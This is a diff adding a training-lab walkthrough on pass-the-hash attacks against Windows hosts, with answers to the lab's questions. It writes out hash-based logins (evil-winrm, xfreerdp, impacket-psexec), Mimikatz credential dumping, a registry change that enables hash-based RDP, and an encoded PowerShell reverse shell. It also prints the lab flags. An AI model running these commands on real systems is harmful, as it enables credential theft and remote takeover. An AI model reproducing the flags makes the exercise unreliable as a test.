@@ -100,3 +100,192 @@ When the registry key is added use `xfreerdp` with the `/pth` option to gain RDP
 xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
 
+
+---
+
+## Questions
+
+Target IP
+```go
+10.129.204.23
+```
+
+User
+```go
+Administrator
+```
+
+Password
+```go
+30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+RDP
+```go
+xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+#### Question 1
+
+Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt.
+
+Use evil-winrm to access the Windows machine
+```go
+evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+![[Pasted image 20250518070643.png]]
+type `type pth.txt` to echo the contents of the file
+```go
+G3t_4CCE$$_V1@_PTH
+```
+
+
+#### Question 2
+
+Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer.
+
+The name of the registry value that must be set to 0 is `DisableRestrictedAdmin`.
+
+Use evil-winrm to get into the box
+```go
+evil-winrm -i 10.129.204.23 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+Now change the registry key value by adding  `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0
+```go
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+![[Pasted image 20250518113123.png]]
+
+Try to RDP again
+```go
+xfreerdp /v:10.129.204.23 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+![[Pasted image 20250518113351.png]]
+
+#### Question 3
+Connect via RDP and use Mimikatz located in c:\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?
+
+Since this is asking us for a single users hash, execute the commands sequentially:
+```go
+mimikatz.exe
+```
+
+```go
+privilege::debug
+```
+
+```go
+sekurlsa::pth
+```
+
+```go
+c39f2beb3d2ec06a62cb887fb391dee0
+```
+
+![[Pasted image 20250518125818.png]]
+
+
+#### Question 4
+Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\david and read the file david.txt.
+
+```go
+mimikatz.exe privilege::debug "sekurlsa::pth /user:david /rc4:c39f2beb3d2ec06a62cb887fb391dee0 /domain:inlanefreight.htb" exit
+```
+
+When the new cmd displays, enter the following to "cat" the contents of david.txt
+```go
+more \\dc01\david\david.txt
+```
+
+Answer
+```go
+D3V1d_Fl5g_is_Her3
+```
+
+![[Pasted image 20250518140728.png]]
+
+#### Question 5
+Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\DC01\julio and read the file julio.txt.
+
+```go
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb" exit
+```
+
+Answer:
+```go
+JuL1()_SH@re_fl@g
+```
+
+![[Pasted image 20250518141100.png]]
+
+#### Question 6
+
+IP:
+```go
+10.129.143.222
+```
+
+Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\julio\flag.txt.
+
+My connection was disconnected so issued the following commands again
+```go
+evil-winrm -i 10.129.143.222 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+In a separate terminal tab...
+```go
+xfreerdp /v:10.129.143.222 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453
+```
+
+
+Now back to the main course...
+
+On the windows box, nav to C:\tools
+```go
+nc.exe -lvnp 8002
+```
+
+In powershell, execute both commands
+```go
+Import-Module .\Invoke-TheHash.psd1
+```
+
+```go
+Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e cG93ZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEyOS4xNDMuMjIyJywgODAwMik7JE5ldHdvcmtTdHJlYW0gPSAkVENQQ2xpZW50LkdldFN0cmVhbSgpOyRTdHJlYW1Xcml0ZXIgPSBOZXctT2JqZWN0IElPLlN0cmVhbVdyaXRlcigkTmV0d29ya1N0cmVhbSk7ZnVuY3Rpb24gV3JpdGVUb1N0cmVhbSAoJFN0cmluZykge1tieXRlW11dJHNjcmlwdDpCdWZmZXIgPSAwLi4kVENQQ2xpZW50LlJlY2VpdmVCdWZmZXJTaXplIHwgJSB7MH07JFN0cmVhbVdyaXRlci5Xcml0ZSgkU3RyaW5nICsgJ1NIRUxMPiAnKTskU3RyZWFtV3JpdGVyLkZsdXNoKCl9V3JpdGVUb1N0cmVhbSAnJzt3aGlsZSgoJEJ5dGVzUmVhZCA9ICROZXR3b3JrU3RyZWFtLlJlYWQoJEJ1ZmZlciwgMCwgJEJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgeyRDb21tYW5kID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0U3RyaW5nKCRCdWZmZXIsIDAsICRCeXRlc1JlYWQgLSAxKTskT3V0cHV0ID0gdHJ5IHtJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZCAyPiYxIHwgT3V0LVN0cmluZ30gY2F0Y2ggeyRfIHwgT3V0LVN0cmluZ31Xcml0ZVRvU3RyZWFtICgkT3V0cHV0KX0kU3RyZWFtV3JpdGVyLkNsb3NlKCki"
+```
+
+
+#### Optional Exercises
+
+Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.
+
+```go
+mimikatz.exe
+```
+
+```go
+privilege::debug
+```
+
+```go
+sekurlsa::logonpasswords
+```
+
+John's Hash
+```go
+c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
+![[Pasted image 20250518152954.png]]
+
+Connect via evil-winrm
+```go
+evil-winrm -i 10.129.143.222 -u John -H c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
+
+Using impacket
+```go
+impacket-psexec John@10.129.143.222 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
+```
